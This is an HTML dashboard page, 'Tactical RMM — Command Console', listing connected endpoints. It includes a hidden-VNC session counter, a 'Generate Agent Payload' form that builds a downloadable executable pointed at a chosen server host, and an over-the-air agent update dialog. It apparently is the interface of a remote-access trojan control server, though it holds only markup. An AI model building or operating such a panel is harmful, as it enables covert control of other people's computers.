<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tactical RMM — Command Console</title>
    <link rel="stylesheet" href="/static/style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
</head>
<body>
    <div id="toastContainer" class="toast-container"></div>

    <div class="master-layout">
        <!-- Top Navigation Header -->
        <header class="master-header">
            <div class="header-left">
                <div class="brand-logo">
                    <div class="logo-icon">
                        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                        </svg>
                    </div>
                    <span class="brand-name">TACTICAL RMM</span>
                    <span class="version-chip">v3.0</span>
                </div>
            </div>

            <!-- Server Status & Compact Metrics HUD -->
            <div class="header-stats">
                <div class="stat-item">
                    <span class="stat-lbl">Endpoints</span>
                    <span class="stat-val" id="statTotal">0</span>
                </div>
                <div class="stat-divider"></div>
                <div class="stat-item">
                    <span class="stat-lbl">Online</span>
                    <span class="stat-val text-emerald" id="statOnline">0</span>
                </div>
                <div class="stat-divider"></div>
                <div class="stat-item">
                    <span class="stat-lbl">Active HVNC</span>
                    <span class="stat-val text-cyan" id="statSessions">0</span>
                </div>
                <div class="stat-divider"></div>
                <div class="server-badge">
                    <span class="status-dot online" id="wsIndicator"></span>
                    <span class="server-state" id="wsStatusText">Master Live</span>
                </div>
            </div>

            <!-- Action Buttons -->
            <div class="header-actions">
                <button class="btn btn-outline" onclick="manualRefresh()" title="Refresh endpoints">
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M21.5 2v6h-6M2.5 22v-6h6M2 11.5a10 10 0 0 1 18.8-4.3M22 12.5a10 10 0 0 1-18.8 4.3"/></svg>
                    <span>Refresh</span>
                </button>
                <button class="btn btn-primary" onclick="openGeneratorModal()" title="Generate new endpoint payload">
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                    <span>New Agent</span>
                </button>
                <button class="btn btn-danger" onclick="logout()" title="Lock session">
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
                    <span>Lock</span>
                </button>
            </div>
        </header>

        <!-- Main Dashboard Body -->
        <main class="dashboard-body">
            <!-- Filter & Search Controls -->
            <div class="table-controls">
                <div class="search-bar">
                    <svg class="search-icon" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2">
                        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>
                    </svg>
                    <input type="text" id="searchInput" placeholder="Search endpoints by tag, hostname, user, IP..." oninput="filterAgents()">
                    <button id="clearSearchBtn" class="clear-search-btn" onclick="clearSearch()" style="display:none;">✕</button>
                </div>

                <div class="filter-pills">
                    <button class="pill active" id="filterAll" onclick="setFilter('all', this)">
                        All (<span id="countAll">0</span>)
                    </button>
                    <button class="pill pill-online" id="filterOnline" onclick="setFilter('online', this)">
                        Online (<span id="countOnline">0</span>)
                    </button>
                    <button class="pill pill-offline" id="filterOffline" onclick="setFilter('offline', this)">
                        Offline (<span id="countOffline">0</span>)
                    </button>
                </div>
            </div>

            <!-- Agent Table Container -->
            <div class="table-card">
                <div class="table-header-info">
                    <div class="table-title">
                        <h3>Managed Endpoints</h3>
                    </div>
                    <div class="table-meta">
                        <span id="agentCountSummary">Showing 0 endpoints</span>
                    </div>
                </div>

                <div class="table-responsive">
                    <table class="agent-table">
                        <thead>
                            <tr>
                                <th style="width: 85px;">Status</th>
                                <th style="width: 170px;">Tag / ID</th>
                                <th>Hostname & User</th>
                                <th style="width: 110px;">OS</th>
                                <th style="width: 130px;">IP Address</th>
                                <th style="width: 90px;">RAM</th>
                                <th style="width: 110px;">Build</th>
                                <th style="width: 100px;">Last Seen</th>
                                <th style="text-align: right; width: 220px;">Actions</th>
                            </tr>
                        </thead>
                        <tbody id="agentTableBody">
                            <!-- Populated dynamically via JS -->
                        </tbody>
                    </table>

                    <div id="emptyState" class="empty-state" style="display:none;">
                        <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="currentColor" stroke-width="1.5"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M7 7h10M7 12h10M7 17h10"/></svg>
                        <p>No endpoints connected.</p>
                        <button class="btn btn-primary" onclick="openGeneratorModal()" style="margin-top: 10px;">+ Generate Agent</button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <!-- Agent Generator Modal -->
    <div id="generatorModal" class="modal-overlay" style="display: none;" onclick="handleBackdropClick(event, 'generatorModal')">
        <div class="modal-card">
            <div class="modal-header">
                <h3>Generate Agent Payload</h3>
                <button class="close-btn" onclick="closeGeneratorModal()">✕</button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label class="form-label">Endpoint Tag / Machine ID</label>
                    <input type="text" id="genEndpointTag" class="form-input" placeholder="Workstation-01">
                </div>
                <div class="form-group">
                    <label class="form-label">Server Connection Host (IP or Domain)</label>
                    <input type="text" id="genServerHost" class="form-input" placeholder="hub.swiftvtu.com">
                </div>
                <div class="form-group">
                    <label class="form-label">Port</label>
                    <input type="text" id="genServerPort" class="form-input" value="443">
                </div>
            </div>
            <div class="modal-actions">
                <button type="button" class="btn btn-secondary" onclick="closeGeneratorModal()">Cancel</button>
                <button type="button" class="btn btn-primary" id="btnBuildAgent" onclick="submitGenerateAgent()">Build & Download Exe</button>
            </div>
        </div>
    </div>

    <!-- Agent OTA Update Modal -->
    <div id="otaModal" class="modal-overlay" style="display: none;" onclick="handleBackdropClick(event, 'otaModal')">
        <div class="modal-card">
            <div class="modal-header">
                <h3>Over-The-Air Agent Update</h3>
                <button class="close-btn" onclick="closeOtaModal()">✕</button>
            </div>
            <div class="modal-body">
                <p id="updateTargetMeta" style="font-size: 13px; color: #38bdf8; font-weight: 600; margin-bottom: 6px;"></p>
                <div style="margin-bottom: 10px;">
                    <span style="font-size: 11px; color: #94a3b8;">New Version: </span>
                    <span id="updateVersionBadge" class="status-tag-ready">3.3.0-live</span>
                </div>
                <p id="updateDescriptionText" style="font-size: 13px; color: #94a3b8; line-height: 1.5; margin-bottom: 14px;"></p>
            </div>
            <div class="modal-actions">
                <button type="button" class="btn btn-secondary" onclick="closeOtaModal()">Cancel</button>
                <button type="button" class="btn btn-primary" id="btnDispatchOta" onclick="confirmPushUpdate()">Dispatch OTA Update Now</button>
            </div>
        </div>
    </div>

    <script src="/static/app.js"></script>
</body>
</html>
